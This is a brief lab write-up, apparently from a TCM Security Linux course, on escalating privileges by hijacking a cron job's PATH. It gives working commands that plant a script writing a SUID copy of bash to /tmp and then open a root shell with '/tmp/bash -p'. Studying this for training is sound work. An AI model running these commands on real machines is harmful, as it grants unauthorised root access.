When you open the crontab, you will find the shell it is running and the path it is using. 

So, in the machine TCM is using, the first location in the path is /home/user. And there is no file called overwrite.sh in this directory. So, we can make a malicious script and run it.

Well... yk the drill:

```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh

chmod +x /home/user/overwrite.sh
```

And now... we wait. 

Then we check whether the script has been run or not:

```shell 
ls -la /tmp
```

If it shows bash, then we have run the script. Then we run this:

```shell
/tmp/bash -p
```
